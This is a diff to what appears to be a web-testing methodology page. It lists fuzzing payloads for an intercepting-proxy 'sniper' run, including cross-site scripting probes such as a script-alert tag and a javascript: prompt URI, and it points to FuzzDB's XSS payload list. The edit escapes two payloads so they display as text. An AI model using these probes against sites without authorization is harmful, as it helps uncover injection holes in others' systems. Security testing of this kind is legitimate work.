@@ -16,10 +16,10 @@ order: 5
 1. Repeat above with sniper and the following payloads (simple list):
 * <code> &lt;&gt;[]{}()$--'#&#34;&amp;;/ </code>
 * <code> '';!--&#34;&lt;XSS&gt;=&amp;{()}</code>
-* <code> <x>'"()= </code>
+* <code> &lt;x&gt;'&#34;()= </code>
 * <code> ;[]{}'"() </code>
 * <code> jAvaSCript:prompt(9vqkz) </code>
-* <code> <script>alert(42);</script> </code>
+* <code> &lt;script&gt;alert(42);&lt;/script&gt; </code>
 
 **Additional Payloads:**
 * Fuzzdb /attack-payloads/xss
